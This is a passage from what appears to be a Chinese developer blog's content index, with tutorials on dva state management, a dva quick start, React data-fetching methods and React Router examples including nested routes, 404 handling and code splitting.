，如果是异步行为（副作用）会先触发 Effects 然后流向 Reducers 最终改变 State，所以在 dva 中，数据流向非常清晰简明，并且思路基本跟开源社区保持一致（也是来自于开源社区）。 二、Models State（type State = any）： State 表示 Model 的状态数据，通常表现为一个 javascript 对象（当然它可以是任何值）。操作的时候每次都要当作不可变数据（immutable data）来对待，保证每次都是全新对象，没有引用关系，这样才能保证 State 的独立性，便于测试和追踪变化。 在 dva 中你可以通过 dva 的实例属性 _store 看到顶部的 state 数据，但是通常你很少会用到: 12const app = dva();console.log(app._store); // 顶部的 state 数据 Action（type AsyncAction = any）： Action 是一个普通 javascript 对象，它是改变 State 的唯一途径。无论是从 UI 事件、网络回调，还是 WebSocket 等数据源所获得的数据，最终都会通过 dispatch 函数调用一个 action，从而改变对应的数据。action 必须带有 type 属性指明具体的行为，其它字段可以自定义，如果要发起一个 action 需要使用 dispatch 函数；需要注意的是 dispatch 是在组件 connect Models 以后，通过 props 传入的: 123dispatch(&#123; type: 'add',&#125;); dispatch 函数（type dispatch = (a: Action) =&gt; Action）： dispatching function 是一个用于触发 action 的函数，action 是改变 State 的唯一途径，但是它只描述了一个行为，而 dipatch 可以看作是触发这个行为的方式，而 Reducer 则是描述如何改变数据的。 在 dva 中，connect Model 的组件通过 props 可以访问到 dispatch，可以调用 Model 中的 Reducer 或者 Effects，常见的形式如： 1234dispatch(&#123; type: 'user/add', // 如果在 model 外调用，需要添加 namespace payload: &#123;&#125;, // 需要传递的信息&#125;); Reducer（type Reducer&lt;S, A&gt; = (state: S, action: A) =&gt; S）： Reducer（也称为 reducing function）函数接受两个参数：之前已经累积运算的结果和当前要被累积的值，返回的是一个新的累积结果。该函数把一个集合归并成一个单值。 Reducer 的概念来自于是函数式编程，很多语言中都有 reduce API。如在 javascript 中： 1234[&#123;x:1&#125;,&#123;y:2&#125;,&#123;z:3&#125;].reduce(function(prev, next)&#123; return Object.assign(prev, next);&#125;)//return &#123;x:1, y:2, z:3&#125; 在 dva 中，reducers 聚合积累的结果是当前 model 的 state 对象。通过 actions 中传入的值，与当前 reducers 中的值进行运算获得新的值（也就是新的 state）。需要注意的是 Reducer 必须是 纯函数 ，所以同样的输入必然得到同样的输出，它们不应该产生任何副作用。并且，每一次的计算都应该使用 immutable data，这种特性简单理解就是每次操作都是返回一个全新的数据（独立，纯净），所以热重载和时间旅行这些功能才能够使用。 Effect： Effect 被称为副作用，它来自于函数编程的概念，之所以叫副作用是因为它使得我们的函数变得不纯，同样的输入不一定获得同样的输出。在我们的应用中，最常见的就是异步操作。 dva 为了控制副作用的操作，底层引入了 redux-sagas 做异步流程控制，由于采用了 generator 的相关概念，所以将异步转成同步写法，从而将 effects 转为纯函数。至于为什么我们这么纠结于纯函数，如果你想了解更多可以阅读 Mostly adequate guide to FP，或者它的中文译本 JS函数式编程指南。 Subscription： Subscriptions 是一种从源获取数据的方法，它来自于 elm。 Subscription 语义是订阅，用于订阅一个数据源，然后根据条件 dispatch 需要的 action。数据源可以是当前的时间、服务器的 websocket 连接、keyboard 输入、geolocation 变化、history 路由变化等等: 12345678910import key from 'keymaster';...app.model(&#123; namespace: 'count', subscriptions: &#123; keyEvent(&#123;dispatch&#125;) &#123; key('⌘+up, ctrl+up', () =&gt; &#123; dispatch(&#123;type:'add'&#125;) &#125;); &#125;, &#125;&#125;); 三、Router 这里的路由通常指的是前端路由，由于我们的应用现在通常是单页应用，所以需要前端代码来控制路由逻辑，通过浏览器提供的 History API 可以监听浏览器 url 的变化，从而控制路由相关操作。 dva 实例提供了 router 方法来控制路由，使用的是react-router： 123456import &#123; Router, Route &#125; from 'dva/router';app.router((&#123;history&#125;) =&gt; &lt;Router history=&#123;history&#125;&gt; &lt;Route path=\"/\" component=&#123;HomePage&#125; /&gt; &lt;/Router&gt;); 四、Route Components 在组件设计方法中，我们提到过 Container Components，在 dva 中我们通常将其约束为 Route Components，因为在 dva 中我们通常以页面维度来设计 Container Components。 所以在 dva 中，通常需要 connect Model 的组件都是 Route Components，组织在 /routes/ 目录下，而 /components/ 目录下则是纯组件（Presentational Components）。 标注： 参考资料1：https://dvajs.com","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"Dva官网之01-上手","slug":"Dva-gw-01","date":"2019-01-07T07:49:37.000Z","updated":"2019-01-25T10:00:24.023Z","comments":true,"path":"2019/01/07/Dva-gw-01/","link":"","permalink":"http://liuxuewen-site.github.io/2019/01/07/Dva-gw-01/","excerpt":"","text":"一、dva 介绍 dva 是一个基于 redux 和 redux-saga 的数据流方案，为了简化开发体验，dva 还额外内置了 react-router 和 fetch，所以可以理解为一个轻量级的应用框架。 特性： 1）易学易用，仅有6个 api，对 redux 用户友好，配合 umi 使用后更是降低为0 api。 2）elm 概念，通过 reducers，effects 和 subscriptions 组织 model。 3）插件机制，比如 dva-loading 可以自动处理 loading 状态，不用一遍遍写 showLoading 和 hideLoading。 4）支持HMR，基于 babel-plugin-dva-hmr 实现 components、routes、models的HMR。 二、安装 dva-cli 通过 npm 安装 dva-cli 并确保版本是 0.9.1 以上: 1npm install dva-cli -g 查看版本： 1dva -v 三、创建新应用 创建 dva-quickstart 目录，包含了项目初始化目录和文件，并提供开发服务器、构建脚本、数据 mock 服务、代理服务器等功能: 1dva new dva-quickstart cd 进入 dva-quickstart 目录，启动开发服务器： 1npm start 浏览器打开http://localhost:8000，会看到 dva 的欢迎页面。 四、使用 antd 通过 npm 安装 antd 和 babel-plugin-import，babel-plugin-import 是用来按需加载 antd 的脚本和样式的： 1npm install antd babel-plugin-import --save 编辑 .webpackrc，使 babel-plugin-import 插件生效: 12345&#123; \"extraBabelPlugins\": [ [\"import\", &#123; \"libraryName\": \"antd\", \"libraryDirectory\": \"es\", \"style\": \"css\" &#125;] ]&#125; 注意：dva-cli 基于 roadhog 实现 build 和 dev，更多 .webpackrc 的配置详见 roadhog 配置。 五、定义路由 写个应用来显示产品列表。首先第一步是创建路由，路由可以想象成是组成应用的不同页面。 新建 route component（routes/Products.js），内容如下： 1234567import React from 'react';const Products = (props) =&gt; ( &lt;h2&gt;List of Products&lt;/h2&gt;);export default Products; 添加路由信息到路由表，编辑 router.js: 123import Products from './routes/Products';...&lt;Route path=\"/products\" exact component=&#123;Products&#125; /&gt; 在浏览器里打开 http://localhost:8000/#/products，应该能看到前面定义的 &lt; h2 &gt; 标签。 六、编写 UI Component 随着应用的发展，会需要在多个页面分享 UI 元素 (或在一个页面使用多次)，在 dva 里你可以把这部分抽成 component。 新建 ProductList component（components/ProductList.js），这样就能在不同的地方显示产品列表了： 1234567891011121314151617181920212223242526272829303132import React from 'react';import PropTypes from 'prop-types';import &#123; Table, Popconfirm, Button &#125; from 'antd';const ProductList = (&#123; onDelete, products &#125;) =&gt; &#123;const columns = [&#123; title: 'Name', dataIndex: 'name',&#125;, &#123; title: 'Actions', render: (text, record) =&gt; &#123; return ( &lt;Popconfirm title=\"Delete?\" onConfirm=&#123;() =&gt; onDelete(record.id)&#125;&gt; &lt;Button&gt;Delete&lt;/Button&gt; &lt;/Popconfirm&gt; ); &#125;,&#125;];return ( &lt;Table dataSource=&#123;products&#125; columns=&#123;columns&#125; /&gt;);&#125;;ProductList.propTypes = &#123;onDelete: PropTypes.func.isRequired,products: PropTypes.array.isRequired,&#125;;export default ProductList; 七、定义 Model 完成 UI 后，现在开始处理数据和逻辑。dva 通过 model 的概念把一个领域的模型管理起来，包含同步更新 state 的 reducers，处理异步逻辑的 effects，订阅数据源的 subscriptions。 新建 model（models/products.js）： 123456789export default &#123; namespace: 'products', state: [], reducers: &#123; 'delete'(state, &#123; payload: id &#125;) &#123; return state.filter(item =&gt; item.id !== id); &#125;, &#125;,&#125;; 这个 model 里： 1）namespace 表示在全局 state 上的 key 2）state 是初始值，在这里是空数组 3）reducers 等同于 redux 里的 reducer，接收 action，同步更新 state 然后在 index.js 里载入它： 12// 3. Modelapp.model(require('./models/products').default); 八、connect 起来 到这里，我们已经单独完成了 model 和 component，那么他们如何串联起来呢，dva 提供了 connect 方法。如果你熟悉 redux，这个 connect 就是 react-redux 的 connect。 编辑 routes/Products.js，替换为以下内容： 1234567891011121314151617181920212223import React from 'react';import &#123; connect &#125; from 'dva';import ProductList from '../components/ProductList';const Products = (&#123; dispatch, products &#125;) =&gt; &#123; function handleDelete(id) &#123; dispatch(&#123; type: 'products/delete', payload: id, &#125;); &#125; return ( &lt;div&gt; &lt;h2&gt;List of Products&lt;/h2&gt; &lt;ProductList onDelete=&#123;handleDelete&#125; products=&#123;products&#125; /&gt; &lt;/div&gt; );&#125;;// export default Products;export default connect((&#123; products &#125;) =&gt; (&#123; products,&#125;))(Products); 最后，我们还需要一些初始数据让这个应用 run 起来。编辑 index.js： 123456789- const app = dva();+ const app = dva(&#123;+ initialState: &#123;+ products: [+ &#123; name: 'dva', id: 1 &#125;,+ &#123; name: 'antd', id: 2 &#125;,+ ],+ &#125;,+ &#125;); 刷新浏览器，应该能看到以下效果： 九、构建应用 完成开发并且在开发环境验证之后，就需要部署给我们的用户了。先执行下面的命令： 1npm run build 几秒后，输出应该如下: 12345678910&gt; @ build /private/tmp/myapp&gt; roadhog buildCreating an optimized production build...Compiled successfully.File sizes after gzip: 82.98 KB dist/index.js 270 B dist/index.css build 命令会打包所有的资源，包含 JavaScript, CSS, web fonts, images, html 等。然后你可以在 dist/ 目录下找到这些文件。 十、例子和脚手架 官方： Count: 简单计数器 User Dashboard: 用户管理 AntDesign Pro：(Demo)，开箱即用的中台前端/设计解决方案 HackerNews: (Demo)，HackerNews Clone antd-admin: (Demo)，基于 antd 和 dva 的后台管理应用 github-stars: (Demo)，Github Star 管理应用 社区： Account System: 小型库存管理系统 react-native-dva-starter: 集成了 dva 和 react-navigation 典型应用场景的 React Native 实例 标注： 参考资料1：https://dvajs.com","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React数据交互","slug":"React-bs-interact","date":"2018-12-19T16:46:55.000Z","updated":"2018-12-19T16:47:49.550Z","comments":true,"path":"2018/12/20/React-bs-interact/","link":"","permalink":"http://liuxuewen-site.github.io/2018/12/20/React-bs-interact/","excerpt":"","text":"一、前言 在 react 中，进行前后端数据交互的方式有很多种，下面我们介绍下常用的几种。注意本文只是简单的介绍下各种方式，至于它们之间的优缺点，以及能从每一种中扩展出的其它功能，请自行学习。 二、Ajax 1234567891011// ajax(get):const gAjax = new XMLHttpRequest();gAjax.open('GET', '/base/fcgi-bin/fcg_wxdownload_config.fcg');gAjax.send();gAjax.onreadystatechange = () =&gt; &#123; if(gAjax.readyState === 4 &amp;&amp; gAjax.status === 200) &#123; console.log(\"ajax get\"); console.log(gAjax.responseText); &#125;&#125;; 123456789101112// ajax(post):const pAjax = new XMLHttpRequest();pAjax.open('POST', '/base/fcgi-bin/fcg_wxdownload_config.fcg');pAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");pAjax.send('a=a&amp;b=b');pAjax.onreadystatechange = () =&gt; &#123; if(pAjax.readyState === 4 &amp;&amp; pAjax.status === 200) &#123; console.log(\"ajax post\"); console.log(pAjax.responseText); &#125;&#125;; 三、jQuery 12345678910111213141516// jquery(get)（跟zepto很像）:import $ from 'jquery';$.ajax(&#123; type: 'GET', url: '/base/fcgi-bin/fcg_wxdownload_config.fcg', success: (res) =&gt; &#123; console.log(\"jquery get\"); console.log(res); &#125;, error: (error) =&gt; &#123; console.log(\"jquery get\"); console.log(error); &#125;&#125;) 1234567891011121314151617// jquery(post)（跟zepto很像）:import $ from 'jquery';$.ajax(&#123; type: 'POST', url: '/base/fcgi-bin/fcg_wxdownload_config.fcg', data: &#123;&#125;, success: (res) =&gt; &#123; console.log(\"jquery post\"); console.log(res); &#125;, error: (error) =&gt; &#123; console.log(\"jquery post\"); console.log(error); &#125;&#125;) 四、axios 12345678910111213// axios(get):import axios from 'axios';axios.get('/base/fcgi-bin/fcg_wxdownload_config.fcg').then((res: any) =&gt; &#123; console.log(\"axios get\"); console.log(res);&#125;).catch(error =&gt; &#123; console.log(\"axios get\"); console.log(error);&#125;) 12345678910111213// axios post:import axios from 'axios';axios.post('/base/fcgi-bin/fcg_wxdownload_config.fcg', &#123;&#125;).then((res: any) =&gt; &#123; console.log(\"axios post\"); console.log(res);&#125;).catch(error =&gt; &#123; console.log(\"axios post\"); console.log(error);&#125;) 五、fetch 1234567891011121314// fetch(get):fetch('/base/fcgi-bin/fcg_wxdownload_config.fcg', &#123; method: 'get',&#125;).then((res) =&gt; &#123; // return res.json(); return res;&#125;).then((data) =&gt; &#123; console.log(\"fetch get\"); console.log(data);&#125;).catch(error =&gt; &#123; console.log(\"fetch get\"); console.log(error);&#125;) 123456789101112131415// fetch(post):fetch('/base/fcgi-bin/fcg_wxdownload_config.fcg', &#123; method: 'post', body: JSON.stringify(&#123;&#125;)&#125;).then((res) =&gt; &#123; // return res.json(); return res;&#125;).then((data) =&gt; &#123; console.log(\"fetch post\"); console.log(data);&#125;).catch(error =&gt; &#123; console.log(\"fetch post\"); console.log(error);&#125;) 六、react跨域 package.json 里配置 proxy（重启）： 123456789101112\"proxy\": &#123; \"/api\": &#123; \"target\": \"http://www.baidu.com/\", \"secure\": false, \"changeOrigin\": true &#125;, \"/base\": &#123; \"target\": \"http://c.y.qq.com/\", \"secure\": false, \"changeOrigin\": true &#125;&#125;, 接口里： 12345/base/fcgi-bin/fcg_wxdownload_config.fcg变http://c.y.qq.com/fcgi-bin/fcg_wxdownload_config.fcg 当然其它的常用的解决跨域的方式也可以。","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React路由实例","slug":"React-bs-router02","date":"2018-12-18T16:02:04.000Z","updated":"2019-01-25T10:17:26.951Z","comments":true,"path":"2018/12/19/React-bs-router02/","link":"","permalink":"http://liuxuewen-site.github.io/2018/12/19/React-bs-router02/","excerpt":"","text":"一、前言 上一篇中大概总结了一下 web 应用的路由，这一篇接着上一篇分享一些例子。 二、简单的路由示例 一个简单的网站结构是首页和几个独立的二级页面，假如我们有三个独立的二级页面分别为：新闻页、课程页、加入我们，路由配置如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344index.js:import React from 'react'import ReactDom from 'react-dom'import &#123; BrowserRouter as Router, Route, NavLink, Switch&#125; from 'react-router-dom'import Home from './pages/Home'import News from './pages/News'import Course from './pages/Course'import JoinUs from './pages/JoinUs'const App = () =&gt; ( &lt;Router&gt; &lt;div&gt; &lt;header&gt; &lt;nav&gt; &lt;ul&gt; &lt;li&gt;&lt;NavLink exact to=\"/\"&gt;首页&lt;/NavLink&gt;&lt;/li&gt; &lt;li&gt;&lt;NavLink to=\"/news\"&gt;新闻&lt;/NavLink&gt;&lt;/li&gt; &lt;li&gt;&lt;NavLink to='/course'&gt;课程&lt;/NavLink&gt;&lt;/li&gt; &lt;li&gt;&lt;NavLink to=\"/joinUs\"&gt;加入我们&lt;/NavLink&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;/header&gt; &lt;Switch&gt; &lt;Route exact path=\"/\" component=&#123;Home&#125;/&gt; &lt;Route path=\"/news\" component=&#123;News&#125;/&gt; &lt;Route path=\"/course\" component=&#123;Course&#125;/&gt; &lt;Route path=\"/joinUs\" render=&#123;(props) =&gt; &lt;JoinUs &#123;...props&#125;/&gt;&#125;/&gt; &lt;/Switch&gt; &lt;/div&gt; &lt;/Router&gt;)ReactDom.render( &lt;App /&gt;, document.getElementById('root')) 一个简单的路由，我们可以将&lt; NavLink &gt;和&lt; Route &gt;都写在 index.js 里面，但这会让每一个页面都渲染出导航栏。 二、抽离导航的路由 假如现在新增了登录页，要求登录页没有导航栏，其它页面有导航栏： 12345678910111213141516171819202122232425262728293031323334353637383940414243index.js:const App = () =&gt; ( &lt;Router&gt; &lt;div&gt; &lt;Switch&gt; &lt;Route exact path=\"/\" component=&#123;Home&#125;/&gt; &lt;Route path=\"/login\" component=&#123;Login&#125;/&gt; &lt;Route path=\"/news\" component=&#123;News&#125;/&gt; &lt;Route path=\"/course\" component=&#123;Course&#125;/&gt; &lt;Route path=\"/joinUs\" render=&#123;(props) =&gt; &lt;JoinUs &#123;...props&#125;/&gt;&#125;/&gt; &lt;/Switch&gt; &lt;/div&gt; &lt;/Router&gt;)ReactDom.render( &lt;App /&gt;, document.getElementById('root'))components/Header.js:import &#123; NavLink&#125; from 'react-router-dom'class Header extends Component &#123; render() &#123; return ( &lt;header&gt; &lt;nav&gt; &lt;ul&gt; &lt;li&gt;&lt;NavLink exact to=\"/\"&gt;首页&lt;/NavLink&gt;&lt;/li&gt; &lt;li&gt;&lt;NavLink to=\"/news\"&gt;新闻&lt;/NavLink&gt;&lt;/li&gt; &lt;li&gt;&lt;NavLink to='/course'&gt;课程&lt;/NavLink&gt;&lt;/li&gt; &lt;li&gt;&lt;NavLink to=\"/joinUs\"&gt;加入我们&lt;/NavLink&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;/header&gt; ) &#125;&#125; 每个页面根据需要选择是否引入&lt; Header &gt;组件。 三、添加404页面 利用&lt; Switch &gt;组件的特性，当前面所有的路由都匹配不上时，会匹配最后一个 path=”*” 的路由，该路由再重定向到404页面： 12345678910111213141516171819202122index.js:import &#123; BrowserRouter as Router, Route, Switch, Redirect&#125; from 'react-router-dom'const App = () =&gt; ( &lt;Router&gt; &lt;Switch&gt; &lt;Route exact path=\"/\" component=&#123;Home&#125;/&gt; &lt;Route path=\"/login\" component=&#123;Login&#125;/&gt; &lt;Route path=\"/news\" component=&#123;News&#125;/&gt; &lt;Route path=\"/course\" component=&#123;Course&#125;/&gt; &lt;Route path=\"/joinUs\" render=&#123;(props) =&gt; &lt;JoinUs &#123;...props&#125;/&gt;&#125;/&gt; &lt;Route path=\"/error\" render=&#123;(props) =&gt; &lt;div&gt;&lt;h1&gt;404 Not Found!&lt;/h1&gt;&lt;/div&gt;&#125;/&gt; &lt;Route path=\"*\" render=&#123;(props) =&gt; &lt;Redirect to='/error'/&gt;&#125;/&gt; &lt;/Switch&gt; &lt;/Router&gt;) 四、嵌套路由 假如课程页下有三个按钮分别为：前端开发、大数据、算法。前面提到过 match 是实现嵌套路由的对象，当我们在某个页面跳转到它的下一级子页面时，我们不会显示地写出当前页面的路由，而是用 match 对象的 path 和 url 属性： 12345678910111213141516171819pages/Course.js：class Course extends Component &#123; render() &#123; let &#123; match &#125; = this.props; return( &lt;div className=\"list\"&gt; &lt;Header /&gt; &lt;NavLink to=&#123;`$&#123;match.url&#125;/front-end`&#125;&gt;前端技术&lt;/NavLink&gt; &lt;NavLink to=&#123;`$&#123;match.url&#125;/big-data`&#125;&gt;大数据&lt;/NavLink&gt; &lt;NavLink to=&#123;`$&#123;match.url&#125;/algorithm`&#125;&gt;算法&lt;/NavLink&gt; &lt;Route path=&#123;`$&#123;match.path&#125;/:name`&#125; render=&#123;(props) =&gt; &lt;div&gt;&#123;props.match.params.name&#125;&lt;/div&gt;&#125;/&gt; &lt;/div&gt; ) &#125;&#125;// match对象的params对象可以获取到/:name的name值 五、带参的嵌套路由 假如新闻页是一个新闻列表，点击某一条新闻时展示该条新闻详情。与上一个示例不同的是，新闻列表页需要将该条新闻的内容传递给新闻详情页，传递参数可以有三种方式： 1）search: ‘’, // 会添加到url里面，形如”?name=melody&amp;age=20” 2）hash: ‘’, // 会添加到url里面，形如”#tab1” 3）state: {}, // 不会添加到url里面 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758pages/News.js:import React, &#123; Component &#125; from 'react'import &#123; Route, NavLink&#125; from 'react-router-dom'import Header from '../components/Header'//模拟数据const data = [ &#123; id: 1, title: '春运地狱级抢票模式开启', content: '春运地狱级抢票模式开启，你抢到回家的票了吗？反正我还没有，难受' &#125;, &#123; id: 2, title: '寒潮来袭，你，冻成狗了吗？', content: '寒潮来袭，你，冻成狗了吗？被子是我亲人，我不想离开它' &#125;]class News extends Component &#123; render() &#123; return( &lt;div className=\"news\"&gt; &lt;Header /&gt; &lt;h1 className=\"title\"&gt;请选择一条新闻：&lt;/h1&gt; &#123;data.map((item) =&gt; ( &lt;div key=&#123;item.id&#125;&gt; &lt;NavLink to=&#123;&#123; pathname: `$&#123;this.props.match.url&#125;/$&#123;item.id&#125;`, state: &#123;data: item&#125; &#125;&#125;&gt; &#123;item.title&#125; &lt;/NavLink&gt; &lt;/div&gt; ))&#125; &lt;Route path=&#123;`$&#123;this.props.match.path&#125;/:id`&#125; render=&#123;(props) =&gt; &#123; let data = props.location.state &amp;&amp; props.location.state.data; return ( &lt;div&gt; &lt;h1&gt;&#123;data.title&#125;&lt;/h1&gt; &lt;p&gt;&#123;data.content&#125;&lt;/p&gt; &lt;/div&gt; ) &#125;&#125;/&gt; &lt;/div&gt; ) &#125;&#125;export default News// &lt;NavLink&gt;传递的参数是通过 location 对象获取的。 六、优化嵌套路由 前面两种嵌套路由，子路由都渲染出了父组件，如果不想渲染出父组件，有两种方法。 方法一：将配置子路由的&lt; Route &gt;写在 index.js 里面 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051index.js：&lt;Route exact path=\"/news\" component=&#123;News&#125;/&gt;&lt;Route path=\"/news/:id\" component=&#123;NewsDetail&#125;/&gt;pages/News.js：class News extends Component &#123; render() &#123; return( &lt;div className=\"news\"&gt; &lt;Header /&gt; &lt;h1 className=\"title\"&gt;请选择一条新闻：&lt;/h1&gt; &#123;data.map((item) =&gt; ( &lt;div key=&#123;item.id&#125;&gt; &lt;NavLink to=&#123;&#123; pathname: `$&#123;this.props.match.url&#125;/$&#123;item.id&#125;`, state: &#123;data: item&#125; &#125;&#125;&gt; &#123;item.title&#125; &lt;/NavLink&gt; &lt;/div&gt; ))&#125; &lt;/div&gt; ) &#125;&#125;pages/NewsDetail.js：import React, &#123; Component &#125; from 'react'import Header from '../components/Header'class NewsDetail extends Component &#123; constructor(props) &#123; super(props) this.data = props.location.state.data; //获取父组件传递过来的数据 &#125; render() &#123; return( &lt;div className=\"news\"&gt; &lt;Header /&gt; &lt;h1&gt;&#123;this.data.title&#125;&lt;/h1&gt; &lt;p&gt;&#123;this.data.content&#125;&lt;/p&gt; &lt;/div&gt; ) &#125;&#125;export default NewsDetail 方法二：仍然将子路由配置写在News.js里面 123456789101112131415161718192021222324252627282930313233343536373839404142index.js:&lt;Route path=\"/news\" component=&#123;News&#125;/&gt;// 注意：这里一定不能加exact，否则子组件永远渲染不出来。pages/News.js:class NewsPage extends Component &#123; render() &#123; return( &lt;div className=\"news\"&gt; &lt;Header /&gt; &lt;h1 className=\"title\"&gt;请选择一条新闻：&lt;/h1&gt; &#123;data.map((item) =&gt; ( &lt;div key=&#123;item.id&#125;&gt; &lt;NavLink to=&#123;&#123; pathname: `$&#123;this.props.match.url&#125;/$&#123;item.id&#125;`, state: &#123;data: item&#125; &#125;&#125;&gt; &#123;item.title&#125; &lt;/NavLink&gt; &lt;/div&gt; ))&#125; &lt;/div&gt; ) &#125;&#125;const News = (&#123;match&#125;) =&gt; &#123; return ( &lt;div&gt; &lt;Route path=&#123;`$&#123;match.path&#125;/:id`&#125; component=&#123;NewsDetail&#125;/&gt; &lt;Route exact path=&#123;match.path&#125; render=&#123;(props) =&gt; &lt;NewsPage &#123;...props&#125; /&gt;&#125;/&gt; &lt;/div&gt; )&#125;export default News// 注意这里的写法其实就是将新闻页也看作一个组件，然后重新定义一个News组件，// 根据路由来渲染不同的组件，exact参数是加在这里的，并且导出的是News而不是NewsPage。 七、页面间传参的一些注意点 在嵌套路由和带参的嵌套路由两小节可以看到两种传参方式，如果仅仅是获取 url 里面的参，比如&lt; Route path={${match.path}/:name} / &gt;的 name 属性，子组件可以通过 this.props.match.params.name 取得，如果还需要多余的参数，比如选中的某一条数据，则父组件通过&lt; NavLink &gt;的 to 属性的 search，hash, state 向子组件传参，子组件通过 this.props.location.search|hash|state 获取。 这两者是有区别的！使用的时候要小心！以上面的新闻详情页为例，详情页的数据是从新闻页直接传过来的： 1this.data = props.location.state.data; 现在让我们随便点进一条新闻，然后刷新它，发现没毛病，然后手动输入另一条存在的新闻id，却报错了： 报错是肯定的，这个页面的数据本身是通过 props.location.state.data 获取的，当我们在这个页面手动输入 id 时，根本没有数据，而且此时打印 state，它的值是 undefined。但是！！通过 props.match.params 却可以获取到 id，所以，这种方式显然更保险，不过你应该也看出来了，由于这种方式涉及到 url 地址栏，所以不可以传递过多的参数，所以开发过程中，要处理好这两种传参方式。 对于上面的新闻详情页例子，一般不需要把整条数据传递过去，而是传递一个 id 或者别的参数，然后在详情页再向服务器发起请求拿到该条数据的详情，可以修改代码： 12345678910111213141516171819202122232425262728pages/NewsDetail.js:constructor(props) &#123; super(props) this.id = props.match.params.id; this.state = &#123; data: '' &#125;&#125;componentWillMount() &#123; this.getNewsDetail();&#125;getNewsDetail() &#123; fetch(`xxx?id=$&#123;this.id&#125;`).then(res =&gt; res.json()) .then(resData =&gt; &#123; this.setState(&#123;data: resData&#125;); &#125;)&#125;render() &#123; let title = this.state.data &amp;&amp; this.state.data.title; let content = this.state.data &amp;&amp; this.state.data.content; return( &lt;div&gt; &lt;h1&gt;&#123;title&#125;&lt;/h1&gt; &lt;p&gt;&#123;content&#125;&lt;/p&gt; &lt;/div&gt; ) &#125; 不过，还是会有必须传递一整条数据过去或者其它更复杂的情况，这种时候就要处理好子组件接收数据的逻辑，以免出现数据为空时报错的情况，修改代码： 1234567891011121314151617181920pages/NewsDetail.js:class NewsDetail extends Component &#123; constructor(props) &#123; super(props) this.data = props.location.state ? props.location.state.data : &#123;&#125; ; &#125; render() &#123; let title = this.data.title || ''; let content = this.data.content || ''; return( &lt;div className=\"news\"&gt; &lt;Header /&gt; &lt;h1&gt;&#123;title&#125;&lt;/h1&gt; &lt;p&gt;&#123;content&#125;&lt;/p&gt; &lt;/div&gt; ) &#125;&#125; 以上两种处理方式都不会再出现用户输入一个不存在的id报错的情况，不过，我们还可以做的更好。 八、根据数据判断是否显示404页面 前面我们实现了一个简单的404页面，即路由不匹配时跳转到404页面，实际开发中还有一种情况，是根据参数去请求数据，请求回来的数据为空，则显示一个404页面，以上面的新闻详情页为例，假如我们现在是在这个页面发起的数据请求，那么我们可以用一个标志位来实现加载404页面： 12345678910111213141516171819202122232425262728293031323334pages/NewsDetail.js：constructor(props) &#123; super(props) this.id = props.match.params.id; this.state = &#123; data: '', hasData: true, // 一开始的初始值一定要为true &#125;&#125;componentWillMount() &#123; this.getNewsDetail();&#125;getNewsDetail() &#123; fetch(`xxx?id=$&#123;this.id&#125;`).then(res =&gt; res.json()) .then(resData =&gt; &#123; if (resData != null) &#123; this.setState(&#123;data: resData&#125;); &#125; else &#123; this.setState(&#123;hasData: false&#125;) &#125; &#125;)&#125;//找不到数据重定向到404页面renderNoDataView() &#123; return &lt;Route path=\"*\" render=&#123;() =&gt; &lt;Redirect to=\"/error\"/&gt;&#125;/&gt;&#125;render() &#123; return this.state.hasData ? this.renderView() : this.renderNoDataView()&#125; 九、按需加载 这是个非常重要的功能，单页面应用有一个非常大的弊端就是首屏会加载其它页面的内容，当项目非常复杂的时候首屏加载就会很慢，当然，解决方法有很多，webpack 有这方面的技术，路由也有，把它们结合起来，就很完美了。 官网的 code-splitting 介绍了路由如何配置按需加载，只是不够详细，它缺少有关 wepback 配置的代码。 安装 bundle-loader: 1yarn add bundle-loader webpack.config.js： 12345678910111213141516171819202122module.exports = &#123; output: &#123; path: path.resolve(__dirname, 'build'), //打包文件的输出路径 filename: 'bundle.js', //打包文件名 chunkFilename: '[name].[id].js', //增加 publicPath: publicPath, &#125;, module: &#123; loaders: [ &#123; test: /\\.bundle\\.js$/, use: &#123; loader: 'bundle-loader', options: &#123; lazy: true, name: '[name]' &#125; &#125; &#125;, ] &#125;,&#125; 项目中需要新建一个 bundle.js 文件，把它放在 components 下： 1234567891011121314151617181920212223242526272829303132333435363738components/Bundle.js：import React, &#123; Component &#125; from 'react'class Bundle extends Component &#123; state = &#123; // short for \"module\" but that is a keyword in js, so \"mod\" mod: null &#125; componentWillMount() &#123; this.load(this.props) &#125; componentWillReceiveProps(nextProps) &#123; if (nextProps.load !== this.props.load) &#123; this.load(nextProps) &#125; &#125; load(props) &#123; this.setState(&#123; mod: null &#125;) props.load((mod) =&gt; &#123; this.setState(&#123; // handle both es imports and cjs mod: mod.default ? mod.default : mod &#125;) &#125;) &#125; render() &#123; return this.state.mod ? this.props.children(this.state.mod) : null &#125;&#125;export default Bundle 修改index.js，首先将引入组件的写法改为： 12import loaderHome from 'bundle-loader?lazy&amp;name=home!./pages/Home'import loaderNews from 'bundle-loader?lazy&amp;name=news!./pages/News' 相当于先经过 bundle-loader 处理，这里的 name 会作为 webpack.config.js 配置的 chunkFilename: ‘[name].[id].js’的name。注意这时候 loaderHome 和 loaderNews 不是我们之前引入的组件了，而组件应该这样生成： 123456789101112const Home = (props) =&gt; ( &lt;Bundle load=&#123;loaderHome&#125;&gt; &#123;(Home) =&gt; &lt;Home &#123;...props&#125;/&gt;&#125; &lt;/Bundle&gt;)const News = (props) =&gt; ( &lt;Bundle load=&#123;loaderNews&#125;&gt; &#123;(News) =&gt; &lt;News &#123;...props&#125;/&gt;&#125; &lt;/Bundle&gt;) 剩下的就和之前的写法一样了。 可以看到在首页会有一个 home.1.js 文件加载进来，在新闻页有一个 news.2.js 